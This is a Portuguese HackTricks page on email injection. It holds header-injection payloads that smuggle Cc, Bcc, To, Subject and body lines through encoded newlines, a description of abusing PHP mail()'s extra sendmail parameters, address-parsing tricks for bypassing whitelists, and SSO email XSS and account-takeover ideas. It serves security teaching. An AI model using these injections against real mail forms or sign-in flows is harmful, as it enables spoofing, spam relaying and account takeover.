# Inje√ß√µes de Email

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Injetar em e-mail enviado

### Injetar Cc e Bcc ap√≥s o argumento do remetente
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
A mensagem ser√° enviada para as contas do destinat√°rio e destinat√°rio1.

### Injetar argumento
```
From:sender@domain.com%0ATo:attacker@domain.com
```
### Injetar argumento de Assunto
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
### Alterar o corpo da mensagem

Injete duas quebras de linha e, em seguida, escreva sua mensagem para alterar o corpo da mensagem.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Explora√ß√£o da fun√ß√£o mail() do PHP
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### O 5¬∫ par√¢metro ($additional\_parameters)

Esta se√ß√£o ser√° baseada em **como abusar desse par√¢metro supondo que um atacante o controle**.

Este par√¢metro ser√° adicionado √† linha de comando que o PHP usar√° para invocar o bin√°rio sendmail. No entanto, ele ser√° sanitizado com a fun√ß√£o `escapeshellcmd($additional_parameters)`.

Um atacante pode **injetar par√¢metros extras para o sendmail** neste caso.

#### Diferen√ßas na implementa√ß√£o do /usr/sbin/sendmail

A interface do **sendmail** √© **fornecida pelo software de e-mail MTA** (Sendmail, Postfix, Exim etc.) instalado no sistema. Embora a **funcionalidade b√°sica** (como os par√¢metros -t -i -f) permane√ßa a **mesma** por raz√µes de compatibilidade, **outras fun√ß√µes e par√¢metros** variam muito dependendo do MTA instalado.

Aqui est√£o alguns exemplos de diferentes p√°ginas de manual do comando/interface sendmail:

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

Dependendo da **origem do bin√°rio sendmail**, diferentes op√ß√µes foram descobertas para abus√°-los e **vazar arquivos ou at√© mesmo executar comandos arbitr√°rios**. Verifique como em [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Injetar no nome do e-mail

### Partes ignoradas de um e-mail

Os s√≠mbolos: **+, -** e **{}** em raras ocasi√µes podem ser usados para marca√ß√£o e ignorados pela maioria dos servidores de e-mail

- Por exemplo: john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Coment√°rios entre par√™nteses ()** no in√≠cio ou no final tamb√©m ser√£o ignorados

- Por exemplo: john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Desvio de lista branca

<figure><img src="../.gitbook/assets/image (4) (6).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Aspas

<figure><img src="../.gitbook/assets/image (6) (4).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Voc√™ tamb√©m pode usar IPs como nomes de dom√≠nio entre colchetes:

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### Outras vulnerabilidades

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../.gitbook/assets/image (296).png>)

## SSO de terceiros

### XSS

Alguns servi√ßos como **github** ou **salesforce permitem** que voc√™ crie um **endere√ßo de e-mail com payloads XSS**. Se voc√™ puder **usar esses provedores para fazer login em outros servi√ßos** e esses servi√ßos **n√£o estiverem sanitizando** corretamente o e-mail, voc√™ poderia causar **XSS**.

### Tomada de Conta

Se um **servi√ßo SSO** permitir que voc√™ **crie uma conta sem verificar o endere√ßo de e-mail fornecido** (como **salesforce**) e ent√£o voc√™ pode usar essa conta para **fazer login em um servi√ßo diferente** que **confia** no salesforce, voc√™ poderia acessar qualquer conta.\
_Obs.: o salesforce indica se o e-mail fornecido foi ou n√£o verificado, ent√£o a aplica√ß√£o deve levar em considera√ß√£o essa informa√ß√£o._

## Responder a

Voc√™ pode enviar um e-mail usando _**De: empresa.com**_ e _**Responder a: atacante.com**_ e se houver alguma **resposta autom√°tica** enviada devido ao e-mail ter sido enviado **de** um **endere√ßo interno**, o **atacante** pode ser capaz de **receber** essa **resposta**.

## Taxa de Rejei√ß√£o Dura

Certos servi√ßos, como a AWS, implementam um limite conhecido como **Taxa de Rejei√ß√£o Dura**, geralmente definido em 10%. Esta √© uma m√©trica cr√≠tica, especialmente para servi√ßos de entrega de e-mail. Quando essa taxa √© excedida, o servi√ßo, como o servi√ßo de e-mail da AWS, pode ser suspenso ou bloqueado.

Uma **rejei√ß√£o dura** refere-se a um **e-mail** que foi devolvido ao remetente porque o endere√ßo do destinat√°rio √© inv√°lido ou inexistente. Isso pode ocorrer por v√°rios motivos, como o **e-mail** sendo enviado para um endere√ßo inexistente, um dom√≠nio que n√£o √© real, ou a recusa do servidor do destinat√°rio em aceitar **e-mails**.

No contexto da AWS, se voc√™ enviar 1000 e-mails e 100 deles resultarem em rejei√ß√µes duras (por motivos como endere√ßos ou dom√≠nios inv√°lidos), isso significaria uma taxa de rejei√ß√£o dura de 10%. Alcan√ßar ou exceder essa taxa pode acionar o bloqueio ou suspens√£o das capacidades de envio de e-mail da AWS SES (Simple Email Service).

√â crucial manter uma baixa taxa de rejei√ß√£o dura para garantir um servi√ßo de e-mail ininterrupto e manter a reputa√ß√£o do remetente. Monitorar e gerenciar a qualidade dos endere√ßos de e-mail em suas listas de envio pode ajudar significativamente a alcan√ßar esse objetivo.

Para obter informa√ß√µes mais detalhadas, a documenta√ß√£o oficial da AWS sobre o tratamento de rejei√ß√µes e reclama√ß√µes pode ser consultada em [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## Refer√™ncias

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

- Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
- Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
- Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
- **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
